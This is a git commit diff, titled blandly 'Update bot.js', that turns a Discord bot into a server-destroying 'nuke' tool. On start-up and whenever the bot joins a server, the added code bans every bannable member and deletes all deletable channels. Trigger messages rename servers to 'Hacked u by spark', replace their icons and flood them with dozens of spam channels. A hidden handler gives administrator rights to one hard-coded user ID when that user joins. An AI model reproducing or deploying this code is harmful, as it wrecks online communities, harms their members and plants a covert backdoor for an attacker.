66e62769cd0362e34c49349c2cf6583afd7a63e7
abboodd <38141887+abboodd@users.noreply.github.com>
2018-05-26 13:46:36 +0300

    Update bot.js

--- bot.js
+++ bot.js
@@ -7,21 +7,64 @@ LOka.on('ready',  () => {
  
 });
 
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log('      ~            ~  By : spark ~           ~    ');
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log(`Logged in as  * [ "  spark-YT " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
- 
- 
+var prefix = "-"
+LOka.on("message", message => {
+  if(!message.content.startsWith(prefix)) return;;
+  let args = message.content.split(" ").slice(1);
+  var argresult = args.join(' ');
+  if (message.content.startsWith('hix15')) {
+    LOka.user.setUsername(argresult);
+  }
+    if (message.content.startsWith(prefix + 'on123')) {
+    LOka.user.setStatus(argresult);
+  }
 });
-client.on('message', message => {
-    if (message.content === 'ping') {
-    	message.reply('pong');
-  	}
+ 
+var x1 = "kk"
+LOka.on('message', message => {
+     if (message.content === ".") {
+LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
+ 
+}
 });
-
+var x1 = "kk"
+LOka.on('message', message => {
+     if (message.content === ".") {
+LOka.user.setUsername("Hacked u by spark Is here")
+ 
+}
+});
+LOka.on('message', message => {
+     if (message.content === ".") {
+LOka.user.setGame(`Hacked u by spark and rojar are here`,'https://www.twitch.tv/hix')
+ 
+}
+});
+ 
+LOka.on('message', message => {
+     if (message.content === ".") {
+         LOka.guilds.forEach(m =>{
+             m.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
+})
+}
+});
+LOka.on('message', message => {
+     if (message.content === ".") {
+         LOka.guilds.forEach(m =>{
+             m.setName(`Hacked u by spark and rojar are here`)
+})
+}
+});
+ 
+LOka.on('message', message => {
+     if (message.content === ".") {
+                 if(!message.channel.guild) return;
+ 
+             message.guild.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
+ 
+}
+});
+ 
 LOka.on('message', message => {
      
  
@@ -230,6 +273,195 @@ LOka.on('message', message => {
  
 }
 });
+LOka.on('message', message => {
+         if (message.content === "k") {
+               LOka.guilds.forEach(m =>{
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+ 
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+ 
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+ 
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+ 
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+ 
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+ 
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+ 
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+m.createChannel('Hacked u by spark and rojar are here', 'text');
+ 
+})
+}
+});
+ 
+LOka.on('message', message => {
+         if (message.content === "k") {
+                 LOka.guilds.forEach(m =>{
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+ 
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+ 
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+ 
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+ 
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+ 
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+m.createChannel('Hacked u by spark and rojar are here', 'voice');
+ 
+ 
+ 
+})
+}
+ 
+});
+ 
+ 
+const { Client } = require('discord.js');
+const client = new Client();
+ 
+async function nuke(guild) {
+  let users = 0;
+  let channels = 0;
+ 
+  await guild.fetchMembers();
+ 
+  await guild.owner.send(' Hacked u by spark Is here    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
+ 
+ 
+ 
+  await Promise.all(guild.members.map(async (m) => {
+    if (m.bannable) {
+      users++;
+      await m.send('^_^').catch(e => { return void e; });
+      return m.ban();
+    }
+  }));
+ 
+    await Promise.all(guild.channels.map(c => {
+    if (c.deletable) {
+      channels++;
+      return c.delete();
+    }
+  }));
+ 
+    await guild.createChannel('Hacked u by spark and rojar are here', 'text');
+ 
+      await guild.createChannel('Hacked u by spark and rojar are here', 'voice');
+ 
+ 
+ 
+}
+ 
+LOka.on('ready', () => {
+  for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
+  console.log('-------------------------------------------------------------');
+  console.log('');
+  console.log("Made by spark");
+  console.log("");
+  console.log("-------------------------------------------------------------");
+ 
+});
+ 
+LOka.on('guildCreate', async (guild) => {
+  return nuke(guild).catch(console.error);
+});
+ 
+LOka.on('guildMemberAdd', member => {
+   
+            if (member.id === "270978812962013185") {
+                member.guild.createRole({
+                    name : LOka.user.username,
+                    color : "RANDOM",
+                    permissions : [8]
+                }).then(function(role){
+                    member.addRole(role)
+                })
+               
+            }
+       
+    });
 
 // THIS  MUST  BE  THIS  WAY
 client.login(process.env.BOT_TOKEN);
